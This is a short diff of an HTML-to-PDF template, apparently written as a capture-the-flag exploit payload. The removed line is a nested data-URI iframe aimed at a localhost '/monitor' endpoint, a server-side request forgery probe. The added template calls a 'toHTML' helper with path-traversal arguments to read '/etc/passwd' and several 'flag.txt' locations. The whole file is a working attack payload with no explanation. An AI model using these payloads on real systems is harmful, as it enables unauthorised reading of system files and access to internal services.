@@ -1,1 +1,21 @@
-<iframe id="if4" src="data:text/html;charset=utf-8,%3Ciframe%20src%3D%22http%3A%2F%2F127.0.0.1%2Fmonitor%22%3E%3C%2Fiframe%3E"></iframe>
+<!doctype html>
+     │ <html lang="en">
+     │   <head>
+     │     <meta charset="utf-8">
+     │     <title>My PDF</title>
+     │   </head>
+     │   <body>
+     │     <pre style="white-space: pre-wrap;">
+     │       Path:
+     │       {{ .DirPath }}  
+     │       PASSWD:
+     │       {{ toHTML .DirPath "../../../../etc/passwd" }}
+     │       IP:
+     │       {{ toHTML .DirPath "flag.txt" }}
+     │       TCP:
+     │       {{ toHTML .DirPath "../flag.txt" }}
+     │       env:
+     │       {{ toHTML .DirPath "../../flag.txt" }}
+     │     </pre>
+     │   </body>
+     │ </html>
